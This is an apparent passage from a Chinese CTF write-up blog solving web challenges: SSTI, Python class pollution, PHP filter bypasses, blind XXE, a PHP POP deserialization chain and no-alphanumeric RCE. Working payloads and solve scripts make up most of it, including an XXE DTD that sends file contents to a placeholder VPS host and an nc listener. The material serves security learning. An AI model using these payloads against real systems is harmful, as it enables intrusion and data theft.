&quot;A&quot;*80 + &quot;)&quot;</span><br><span class="line"> </span><br><span class="line">r = requests.post(url, params=&#123;&quot;?&quot;: get_val&#125;, data=&#123;&quot;preg&quot;: preg&#125;, timeout=10)</span><br><span class="line">print(&quot;HTTP&quot;, r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><h4 id="考点：SSTI漏洞"><a href="#考点：SSTI漏洞" class="headerlink" title="考点：SSTI漏洞"></a>考点：SSTI漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/qq_61955196/article/details/132237648</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jinjia2牌留言板，来说点什么吧~</span><br></pre></td></tr></table></figure><p><strong>测试</strong>漏洞存在情况</p><p><img src="/../images/image-20251109231754885.png" alt="image-20251109231754885"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110164203821.png" alt="image-20251110164203821"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[156].__init__.__globals__.popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110164344001.png" alt="image-20251110164344001"></p><p>使用request绕过单引号和双引号，查看源码找传参，访问了&#x2F;ssti路由，⽤POST⽅法传参messge。</p><p><img src="/../images/image-20251110164622245.png" alt="image-20251110164622245"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[156].__init__.__globals__.popen(request.form.a).read()&#125;&#125;&amp;a=cat /flag</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110164958883.png" alt="image-20251110164958883"></p><h3 id="这是什么函数"><a href="#这是什么函数" class="headerlink" title="这是什么函数"></a>这是什么函数</h3><h4 id="考点：python原型链污染"><a href="#考点：python原型链污染" class="headerlink" title="考点：python原型链污染"></a>考点：python原型链污染</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">没见过？搜一下！在/flag</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110165413127.png" alt="image-20251110165413127"></p><p>提示信息收集，那么目录扫描一下</p><p><img src="/../images/image-20251110171757499.png" alt="image-20251110171757499"></p><p>&#x2F;flag和&#x2F;src路由，在&#x2F;src当中源码泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask,request,render_template</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line"></span><br><span class="line">def is_json(data):</span><br><span class="line">    try:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        return True</span><br><span class="line">    except ValueError:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">class cls():</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">cat = &quot;where is the flag?&quot;</span><br><span class="line">dog = &quot;how to get the flag?&quot;</span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/flag&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def flag():</span><br><span class="line">    with open(&#x27;/flag&#x27;,&#x27;r&#x27;) as f:</span><br><span class="line">        flag = f.read().strip()</span><br><span class="line">    if cat == dog:</span><br><span class="line">        return flag </span><br><span class="line">    else:</span><br><span class="line">        return cat + &quot; &quot; + dog</span><br><span class="line">@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def src():</span><br><span class="line">    return open(__file__, encoding=&quot;utf-8&quot;).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/pollute&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def Pollution():</span><br><span class="line">    if request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;fail&quot;</span><br><span class="line">    return &quot;success&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;,port=5000)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110170414105.png" alt="image-20251110170414105"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag：判断全局变量cat和dog是否相同，相同则输出flag，否则输出cat和dog变量值。</span><br><span class="line">/src：显示当前⽂件，即file。</span><br><span class="line">/pollute：将收到的json格式数据当作参数，执⾏⾃定义函数merge(),并且回显是否执⾏成功。</span><br></pre></td></tr></table></figure><p>则有两种污染获得flag的方法，要么将cat和dog其中一个进行污染使其相等，要么将file污染成flag直接读出来,然后访问&#x2F;flag或者&#x2F;src就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">             &quot;__file__&quot; : &quot;/flag&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;__init__&quot; : &#123;</span><br><span class="line">        &quot;__globals__&quot; : &#123;</span><br><span class="line">              &quot;dog&quot; : &quot;where is the flag?&quot;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>官p的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def fetch_flag(base_url, pollute_data):</span><br><span class="line">    try:</span><br><span class="line">        # 发送POST请求到/pollute路由</span><br><span class="line">        pollute_response = requests.post(</span><br><span class="line">            f&quot;&#123;base_url&#125;/pollute&quot;,</span><br><span class="line">            json=pollute_data,</span><br><span class="line">            headers=&#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;</span><br><span class="line">        )</span><br><span class="line">        print(f&quot;Pollute请求状态码: &#123;pollute_response.status_code&#125;&quot;)</span><br><span class="line">        pollute_response.raise_for_status()</span><br><span class="line">        </span><br><span class="line">        # 请求flag路由</span><br><span class="line">        flag_response = requests.get(f&quot;&#123;base_url&#125;/flag&quot;)</span><br><span class="line">        print(f&quot;Flag请求状态码: &#123;flag_response.status_code&#125;&quot;)</span><br><span class="line">        flag_response.raise_for_status()</span><br><span class="line">        </span><br><span class="line">        # 提取flag</span><br><span class="line">        content = flag_response.text</span><br><span class="line">        match = re.search(r&#x27;flag\&#123;.*?\&#125;&#x27;, content)</span><br><span class="line">        if match:</span><br><span class="line">            return match.group()</span><br><span class="line">        else:</span><br><span class="line">            return &quot;未找到flag特征字符串&quot;</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        return f&quot;请求发⽣错误: &#123;str(e)&#125;&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return f&quot;发⽣错误: &#123;str(e)&#125;&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    BASE_URL = &quot;http://challenge.ilovectf.cn:30462&quot;</span><br><span class="line">    POLLUTE_DATA = &#123;</span><br><span class="line">        &quot;__init__&quot; : &#123;</span><br><span class="line">            &quot;__globals__&quot; : &#123;</span><br><span class="line">                &quot;dog&quot; : &quot;where is the flag?&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result = fetch_flag(BASE_URL, POLLUTE_DATA)</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110171734186.png" alt="image-20251110171734186"></p><h3 id="Look-at-the-picture"><a href="#Look-at-the-picture" class="headerlink" title="Look at the picture"></a><strong>Look at the picture</strong></h3><h4 id="考点：php伪协议"><a href="#考点：php伪协议" class="headerlink" title="考点：php伪协议"></a>考点：php伪协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你想看什么图片都行，但只能是http协议哦~ 不要偷偷用其它的</span><br></pre></td></tr></table></figure><p>目录扫描到<a href="http://www.zip/">www.zip</a></p><p><img src="/../images/image-20251110173244488.png" alt="image-20251110173244488"></p><p>查看源码有file_get_contents的任意⽂件读取漏洞，还有黑名单限制关键词</p><p><img src="/../images/image-20251110173605876.png" alt="image-20251110173605876"></p><p>用php:&#x2F;&#x2F;filter来进行对黑名单的绕过</p><p><img src="/../images/image-20251110174127984.png" alt="image-20251110174127984"></p><p>官方题解当中说了，常⽤的base64和string被ban了，可以使用下面的过滤器进行绕过也ok，记下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;源编码&gt;.&lt;⽬标编码&gt;</span><br><span class="line">这个过滤器可以进⾏任意字符编码之间的转换</span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="查查忆"><a href="#查查忆" class="headerlink" title="查查忆"></a><strong>查查忆</strong></h3><h4 id="考点：无回显xxe"><a href="#考点：无回显xxe" class="headerlink" title="考点：无回显xxe"></a>考点：无回显xxe</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查一查关于XML的回忆</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/Libra1313/article/details/149851715?spm=1001.2101.3001.10752</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251110224850936.png" alt="image-20251110224850936"></p><p>读取该flag文件，无回显加载外部dtd文件</p><p>正常来说在vps上放dtd文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///f1111llllaa44g&quot;&gt;</span><br><span class="line">&lt;!ENTITY % code &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xx.xx.xx.xx/:11111?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>然后对过滤词进行编码绕过</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://xx.xx.xx.xx/xxe.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %dtd;%code;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE a +AFs</span><br><span class="line">    +ADwAIQ-ENTITY +ACU dtd SYSTEM +ACI-http://xx.xx.xx.xx/xxe.dtd+ACIAPg</span><br><span class="line">    +ACU-dtd+ADsAJQ-code+ADsAJQ-send+ADs</span><br><span class="line">+AF0APg-</span><br></pre></td></tr></table></figure><p>然后vps开启11111端口，查询口输入payload即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 11111</span><br></pre></td></tr></table></figure><p>但是复现的是一直带外不了，也不知道为什么</p><h3 id="魔术大杂烩"><a href="#魔术大杂烩" class="headerlink" title="魔术大杂烩"></a><strong>魔术大杂烩</strong></h3><h4 id="考点：PHP反序列化的POP链"><a href="#考点：PHP反序列化的POP链" class="headerlink" title="考点：PHP反序列化的POP链"></a>考点：PHP反序列化的POP链</h4><p>给的基础知识点</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;__get():在对象中调⽤⼀个不可访问的或不存在的变量时触发，和符号&quot;&amp;有关。&quot;__get($key)的$key是你触发&quot;__get()时访问的那个不存在的变量。</span><br><span class="line">&quot;__call()：在对象中调⽤⼀个不存在的⽅法时⾃动调⽤这个⽅法，和符号&quot;&amp;有关。&quot;__call($name,$arg)的$name和$arg是触发时调⽤的⽅法名和参数。</span><br><span class="line">&quot;__toString()：当⼀个对象被当做字符串输出或使⽤时触发，能触发的关键字有echo，正则函数（会进⾏类型转换），与strtolower();，die();和md5();,sha1();等函数有关。 类似</span><br><span class="line">于$this&quot;&amp;mimi&quot;&#x27;&#x27;nohajimi&#x27;;的赋值操作也会触发。</span><br><span class="line">&quot;__invoke()：当⼀个对象被作为函数调⽤时⾃动调⽤这个⽅法，和()有关。</span><br><span class="line">&quot;__wakeup()：在对象被反序列化之后⾃动调⽤这个⽅法，和unserialize关键字有关。</span><br><span class="line">&quot;__destruct()：对象被销毁时触发，如在脚本结束时php通常会进⾏清理，通常会触发析构函数。</span><br><span class="line">&quot;__constract()：对象被创建时触发，和new关键字有关。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">魔术师POP做的大杂烩，味真足~</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Wuhuarou&#123;</span><br><span class="line">    public $Wuhuarou;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        echo &quot;Nice Wuhuarou!&lt;/br&gt;&quot;;</span><br><span class="line">        echo $this -&gt; Wuhuarou;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Fentiao&#123;</span><br><span class="line">    public $Fentiao;</span><br><span class="line">    public $Hongshufentiao;</span><br><span class="line">    public function __toString()&#123;</span><br><span class="line">        echo &quot;Nice Fentiao!&lt;/br&gt;&quot;;</span><br><span class="line">        return $this -&gt; Fentiao -&gt; Hongshufentiao;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Baicai&#123;</span><br><span class="line">    public $Baicai;</span><br><span class="line">    public function __get($key)&#123;</span><br><span class="line">        echo &quot;Nice Baicai!&lt;/br&gt;&quot;;</span><br><span class="line">        $Baicai = $this -&gt; Baicai;</span><br><span class="line">        return $Baicai();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Wanzi&#123;</span><br><span class="line">    public $Wanzi;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        echo &quot;Nice Wanzi!&lt;/br&gt;&quot;;</span><br><span class="line">        return $this -&gt; Wanzi -&gt; Xianggu();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Xianggu&#123;</span><br><span class="line">    public $Xianggu;</span><br><span class="line">    public $Jinzhengu;</span><br><span class="line">    public function __construct($Jinzhengu)&#123;</span><br><span class="line">        $this -&gt; Jinzhengu = $Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __call($name, $arg)&#123;</span><br><span class="line">        echo &quot;Nice Xianggu!&lt;/br&gt;&quot;;</span><br><span class="line">        $this -&gt; Xianggu -&gt; Bailuobo = $this -&gt; Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Huluobo&#123;</span><br><span class="line">    public $HuLuoBo;</span><br><span class="line">    public function __set($key,$arg)&#123;</span><br><span class="line">        echo &quot;Nice Huluobo!&lt;/br&gt;&quot;;</span><br><span class="line">        eval($arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;eat&#x27;]))&#123;</span><br><span class="line">    unserialize($_POST[&#x27;eat&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20251112203848732.png" alt="image-20251112203848732"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Wuhuarou</span><br><span class="line">&#123;</span><br><span class="line">    public $Wuhuarou;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Fentiao</span><br><span class="line">&#123;</span><br><span class="line">    public $Fentiao;</span><br><span class="line">    public $Hongshufentiao;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Baicai</span><br><span class="line">&#123;</span><br><span class="line">    public $Baicai;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Wanzi</span><br><span class="line">&#123;</span><br><span class="line">    public $Wanzi;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Xianggu</span><br><span class="line">&#123;</span><br><span class="line">    public $Xianggu;</span><br><span class="line">    public $Jinzhengu;</span><br><span class="line"></span><br><span class="line">    public function __construct($Jinzhengu)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;Jinzhengu = $Jinzhengu;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Huluobo</span><br><span class="line">&#123;</span><br><span class="line">    public $HuLuoBo;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new Wuhuarou();</span><br><span class="line">$a-&gt;Wuhuarou = new Fentiao();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao = new Baicai();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai = new Wanzi();</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi = new Xianggu(&#x27;system(&quot;cat /flag&quot;);&#x27;);</span><br><span class="line">$a-&gt;Wuhuarou-&gt;Fentiao-&gt;Baicai-&gt;Wanzi-&gt;Xianggu = new Huluobo();</span><br><span class="line"></span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag就在flag.php里，童叟无欺的啦</span><br></pre></td></tr></table></figure><h4 id="考点-php非法参数名传参-无字母数字rce-命令执行长度限制绕过"><a href="#考点-php非法参数名传参-无字母数字rce-命令执行长度限制绕过" class="headerlink" title="考点:php非法参数名传参,无字母数字rce,命令执行长度限制绕过"></a>考点:php非法参数名传参,无字母数字rce,命令执行长度限制绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$code = $_GET[&#x27;c1n_y0.u g3t+fl&amp;g?&#x27;];</span><br><span class="line">if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">    die(&quot;hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(strlen($code)&gt;14)&#123;</span><br><span class="line">    die(&quot;is tooooooooooooooooooo long!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Flag is in flag.php~~ (local).&quot;;</span><br><span class="line">@eval($code);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>非法变量名：php版本⼩于8，如果参数中出现中括号[，中括号会被转换成下划线_，如果后⾯还有⾮法字符(. [ 空格)，则不会被继续转换成下划线，符号注意url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1n[y0.u%20g3t%2Bfl%26g?</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.qwesec.com/2024/03/noLettersOrNumbersRCE.html#%E6%80%9D%E8%B7%AF</span><br><span class="line">https://blog.csdn.net/q20010619/article/details/109206728</span><br></pre></td></tr></table></figure><p>取反加&#96;&#96;执行命令加四字符绕过长度限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c1n[y0.u%20g3t%2Bfl%26g?=$_=~%C1%9C%9E%8B;`$_`;</span><br><span class="line">?c1n[y0.u%20g3t%2Bfl%26g?=`*&gt;=`;</span><br></pre></td></tr></table></figure><h4 id="非预期解"><a href="#非预期解" class="headerlink" title="非预期解"></a>非预期解</h4><p>在别的师傅【未知的师傅】那里学来的文件上传写入flag到txt下</p><p>run.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag.php &gt; 1.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传文件同时，执行 shell</span></span><br><span class="line">url = <span class="string">r&quot;http://challenge.ilovectf.cn:30590/?c1n%5By0.u%20g3t%2Bfl%26g%3F=`.+/*/*[@-[]`;&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="built_in">open</span>(<span class="string">r&quot;D:\强制文件上传\run.sh&quot;</span>)&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><h3 id="MySQL管理工具"><a href="#MySQL管理工具" class="headerlink" title="MySQL管理工具"></a>MySQL管理工具</h3><h4 id="考点：JWT伪造，MySQL任意文件读取漏洞-py-yaml反序列化"><a href="#考点：JWT伪造，MySQL任意文件读取漏洞-py-yaml反序列化" class="headerlink" title="考点：JWT伪造，MySQL任意文件读取漏洞,py-yaml反序列化"></a>考点：JWT伪造，MySQL任意文件读取漏洞,py-yaml反序列化</h4><p><img src="/../images/image-20251111183656103.png" alt="image-20251111183656103"></p><p>查看源码存在弱口令，登录上去发现是一个mysql连接页面，随意输入密码显示权限不足</p><p><img src="/../images/image-20251111183903444.png" 